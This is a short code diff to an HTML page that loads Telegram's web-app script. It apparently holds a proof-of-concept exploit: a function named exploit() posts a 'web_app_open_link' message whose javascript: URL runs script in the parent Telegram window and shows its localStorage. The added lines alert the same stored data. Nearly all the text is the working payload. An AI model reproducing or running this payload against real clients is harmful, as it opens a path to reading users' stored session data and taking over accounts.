@@ -58,6 +58,8 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script>
         function exploit() {
+            alert("a");
+            alert(window.parent.localStorage);
             window.parent.postMessage(JSON.stringify({eventType: 'web_app_open_link', eventData: {url: "javascript:alert(JSON.stringify(window.parent.localStorage))"}}), '*');
         }
         </script>
